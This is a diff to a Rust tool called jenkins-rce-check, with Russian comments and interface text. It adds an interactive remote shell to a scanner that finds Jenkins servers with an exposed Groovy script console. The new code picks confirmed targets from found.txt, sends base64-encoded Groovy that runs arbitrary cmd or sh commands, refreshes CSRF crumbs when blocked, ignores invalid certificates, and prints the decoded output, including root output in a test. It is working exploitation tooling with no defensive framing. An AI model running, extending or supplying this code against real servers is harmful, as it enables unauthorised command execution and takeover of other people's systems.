@@ -8,6 +8,8 @@ use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
 
+use base64::engine::general_purpose::STANDARD as B64;
+use base64::Engine;
 use futures::stream::{self, StreamExt};
 use reqwest::header::{HeaderMap, HeaderValue, CONNECTION, CONTENT_TYPE, COOKIE, SET_COOKIE};
 use reqwest::{Client, RequestBuilder};
@@ -41,6 +43,8 @@ const ENDPOINTS: [(&str, &str); 8] = [
 // Маркер в proof. Позволяет перепроверить цель другой командой с тем же nonce:
 //   jenkins-rce-check.exe <target> -c whoami --nonce <nonce>
 const PROOF_MARKER: &str = "RCEPROOF";
+const SHELL_MARKER: &str = "RCE_SHELL";
+const SHELL_TIMEOUT_SECS: u64 = 30;
 
 // Любое из этих подстрок в ответе означает ошибку/защиту, а не вывод команды.
 const ERROR_MARKERS: [&str; 5] = [
@@ -147,6 +151,7 @@ struct Config {
 enum Input {
     Single(String),
     Batch(Vec<String>),
+    Shell(String),
 }
 
 struct Chosen {
@@ -199,11 +204,13 @@ fn usage() -> &'static str {
      \n\
      Использование:\n\
        jenkins-rce-check [ЦЕЛЬ] [опции]\n\
-       jenkins-rce-check -l targets.txt [опции]\n\
-       jenkins-rce-check              открыть меню\n\
+        jenkins-rce-check -l targets.txt [опции]\n\
+        jenkins-rce-check --shell <url>  интерактивный шелл\n\
+        jenkins-rce-check              открыть меню (п.3 — выбор из found.txt)\n\
      \n\
      Опции:\n\
-       -l, --list <file>       список целей (по одной на строку, '#' — комментарий)\n\
+        -s, --shell <url>       интерактивный шелл на подтверждённой цели\n\
+        -l, --list <file>       список целей (по одной на строку, '#' — комментарий)\n\
        -o, --output <file>     записать все результаты в JSONL (удобно для jq)\n\
        -c, --command <name>    команда proof: id, whoami, hostname, pwd, uname, date (по умолчанию id)\n\
        --nonce <str>           свой маркер proof (иначе генерируется; нужен для перепроверки другой командой)\n\
@@ -310,6 +317,52 @@ fn find_default_targets() -> Result<Vec<String>, String> {
     Err("targets.txt не найден (ни в текущей папке, ни рядом с exe)".to_string())
 }
 
+fn find_found() -> Result<Vec<String>, String> {
+    let mut candidates = vec![PathBuf::from("found.txt")];
+    if let Ok(mut exe_dir) = env::current_exe() {
+        exe_dir.pop();
+        exe_dir.push("found.txt");
+        candidates.push(exe_dir);
+    }
+    for path in candidates {
+        if path.exists() {
+            return read_targets(&path);
+        }
+    }
+    Err("found.txt не найден (ни в текущей папке, ни рядом с exe)".to_string())
+}
+
+fn choose_target_from_found() -> Result<String, i32> {
+    let targets = match find_found() {
+        Ok(v) => v,
+        Err(e) => {
+            println!("[!] {e}");
+            return Err(2);
+        }
+    };
+    println!("\nПодтверждённые цели из found.txt:");
+    for (i, t) in targets.iter().enumerate() {
+        println!("  {}) {t}", i + 1);
+    }
+    let answer = match prompt("Выберите номер или URL (0 — отмена): ") {
+        Some(s) => s,
+        None => return Err(0),
+    };
+    if answer.is_empty() || answer == "0" {
+        return Err(0);
+    }
+    if let Ok(n) = answer.parse::<usize>() {
+        if n >= 1 && n <= targets.len() {
+            return Ok(targets[n - 1].clone());
+        }
+    }
+    if let Some(t) = targets.iter().find(|t| **t == answer) {
+        return Ok(t.clone());
+    }
+    println!("[!] неверный выбор");
+    Err(2)
+}
+
 fn prompt(message: &str) -> Option<String> {
     print!("{message}");
     let _ = io::stdout().flush();
@@ -327,9 +380,10 @@ fn interactive() -> Result<Chosen, i32> {
         println!();
         println!("  1) Проверить одну цель");
         println!("  2) Проверить список из targets.txt");
-        println!("  3) Справка");
+        println!("  3) Интерактивный шелл (из found.txt)");
+        println!("  4) Справка");
         println!("  0) Выход");
-        let choice = match prompt("Выберите [0-3]: ") {
+        let choice = match prompt("Выберите [0-4]: ") {
             Some(c) => c,
             None => {
                 pause_console();
@@ -361,7 +415,16 @@ fn interactive() -> Result<Chosen, i32> {
                 }
                 Err(e) => println!("[!] {e}"),
             },
-            "3" => println!("{}", usage()),
+            "3" => match choose_target_from_found() {
+                Ok(url) => {
+                    let mut config = default_config();
+                    config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+                    return Ok(Chosen { input: Input::Shell(url), config, keep_console: true });
+                }
+                Err(0) => continue,
+                Err(code) => return Err(code),
+            },
+            "4" => println!("{}", usage()),
             "0" | "" => {
                 pause_console();
                 return Err(0);
@@ -399,6 +462,7 @@ fn parse_input() -> Result<Chosen, i32> {
 
     let mut single: Option<String> = None;
     let mut list_file: Option<PathBuf> = None;
+    let mut shell = false;
     let mut config = default_config();
 
     let mut i = 0;
@@ -410,6 +474,10 @@ fn parse_input() -> Result<Chosen, i32> {
                 return Err(0);
             }
             "--no-color" => FORCE_NO_COLOR.store(true, Ordering::Relaxed),
+            "-s" | "--shell" => {
+                single = Some(next_value(&args, &mut i, arg)?);
+                shell = true;
+            }
             "-l" | "--list" => {
                 list_file = Some(PathBuf::from(next_value(&args, &mut i, arg)?));
             }
@@ -457,6 +525,15 @@ fn parse_input() -> Result<Chosen, i32> {
             }
         }
         i += 1;
+    }
+
+    if shell {
+        if list_file.is_some() {
+            eprintln!("[!] --shell и -l несовместимы");
+            return Err(2);
+        }
+        let t = single.take().expect("--shell без цели");
+        return Ok(Chosen { input: Input::Shell(t), config, keep_console: false });
     }
 
     let input = match (single, list_file) {
@@ -653,6 +730,85 @@ async fn post_script(
     }
     let form = [("script", groovy), ("Submit", "Run")];
     send(client.post(url).headers(headers).form(&form), rl).await
+}
+
+// Команда и вывод идут base64, чтобы кавычки, $ и переводы строк не ломали Groovy.
+fn shell_groovy(cmd_b64: &str, nonce: &str) -> String {
+    format!(
+        "def c = new String('{cmd_b64}'.decodeBase64(), 'UTF-8'); \
+         def os = System.getProperty('os.name').toLowerCase(); \
+         def p = os.contains('windows') ? ['cmd','/c',c].execute() : ['/bin/sh','-c',c].execute(); \
+         def o = new String(p.getInputStream().bytes, 'UTF-8') + new String(p.getErrorStream().bytes, 'UTF-8'); \
+         return '{SHELL_MARKER}_{nonce}:' + o.bytes.encodeBase64().toString()"
+    )
+}
+
+fn shell_output(body: &str, nonce: &str) -> Option<String> {
+    let pres: Vec<String> = extract_pre_blocks(body)
+        .iter()
+        .map(|p| clean_text(p).trim().to_string())
+        .filter(|s| !s.is_empty())
+        .collect();
+    let text = pres.last().cloned().unwrap_or_else(|| clean_text(body));
+    let marker = format!("{SHELL_MARKER}_{nonce}:");
+    let idx = text.find(&marker)?;
+    let raw = text[idx + marker.len()..].trim();
+    B64.decode(raw).ok().map(|b| String::from_utf8_lossy(&b).into_owned())
+}
+
+async fn shell_session(client: Client, target: String, nonce: String, rl: Arc<RateLimiter>) {
+    let base = normalize(&target);
+    let u_script = format!("{base}/script");
+    let u_crumb = format!("{base}/crumbIssuer/api/json");
+    println!("Шелл: {base}  (/exit — выход, /help — справка)");
+
+    let first = get(&client, &u_crumb, &rl).await;
+    let mut cookie = cookies_from(&first.headers);
+    let mut crumb = parse_crumb(&first.body);
+
+    loop {
+        let line = match prompt("shell> ") {
+            Some(s) => s,
+            None => break,
+        };
+        let cmd = line.trim();
+        if cmd.eq_ignore_ascii_case("/exit") || cmd.eq_ignore_ascii_case("exit") {
+            break;
+        }
+        if cmd.eq_ignore_ascii_case("/help") {
+            println!("  /exit   — выйти");
+            println!("  /help   — эта справка");
+            println!("  любая другая строка выполняется как команда оболочки на цели");
+            continue;
+        }
+        if cmd.is_empty() {
+            continue;
+        }
+
+        let b64 = B64.encode(cmd.as_bytes());
+        let groovy = shell_groovy(&b64, &nonce);
+        let mut out = post_script(&client, &u_script, &crumb, &cookie, &groovy, &rl).await;
+
+        if shell_output(&out.body, &nonce).is_none() {
+            let low = out.body.to_ascii_lowercase();
+            if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
+                let (c, nc) = fetch_crumb(&client, &u_crumb, &cookie, &rl).await;
+                crumb = c;
+                merge_cookie(&mut cookie, nc);
+                out = post_script(&client, &u_script, &crumb, &cookie, &groovy, &rl).await;
+            }
+        }
+
+        match shell_output(&out.body, &nonce) {
+            Some(text) => print!("{text}"),
+            None => {
+                let snippet: String = clean_text(&out.body).chars().take(300).collect();
+                println!("[!] нет вывода (HTTP {}): {}", out.status, snippet);
+            }
+        }
+        let _ = io::stdout().flush();
+    }
+    println!("Шелл закрыт.");
 }
 
 fn strip_tags(s: &str) -> String {
@@ -1022,9 +1178,23 @@ async fn main() -> ExitCode {
         Err(code) => return ExitCode::from(code as u8),
     };
 
+    if let Input::Shell(t) = &chosen.input {
+        let client = Client::builder()
+            .danger_accept_invalid_certs(true)
+            .timeout(Duration::from_secs(SHELL_TIMEOUT_SECS))
+            .connect_timeout(Duration::from_millis(CONNECT_TIMEOUT_MS))
+            .user_agent(UA)
+            .build()
+            .expect("failed to build shell HTTP client");
+        let rl = Arc::new(RateLimiter::new(None));
+        shell_session(client, t.clone(), chosen.config.nonce.clone(), rl).await;
+        return ExitCode::SUCCESS;
+    }
+
     let (targets, batch) = match chosen.input {
         Input::Single(t) => (vec![t], false),
         Input::Batch(v) => (v, true),
+        Input::Shell(_) => unreachable!(),
     };
     let total = targets.len();
 
@@ -1238,6 +1408,18 @@ mod tests {
         let body2 = "<pre>RCEPROOF_abc123:garbage output</pre>";
         assert!(validate_proof(&resp(200, body2), "id", "abc123", true).is_none());
         assert!(validate_proof(&resp(200, body2), "date", "abc123", true).is_some());
+    }
+
+    #[test]
+    fn shell_groovy_and_output_roundtrip() {
+        let nonce = "abc123";
+        let b64 = B64.encode(b"echo 'hi' $HOME".as_slice());
+        let g = shell_groovy(&b64, nonce);
+        assert!(g.contains("RCE_SHELL_abc123:"));
+        assert!(g.contains("decodeBase64()"));
+        let payload = B64.encode(b"uid=0(root)\n".as_slice());
+        let body = format!("<html><pre>RCE_SHELL_abc123:{payload}</pre></html>");
+        assert_eq!(shell_output(&body, nonce).unwrap(), "uid=0(root)\n");
     }
 
     #[test]
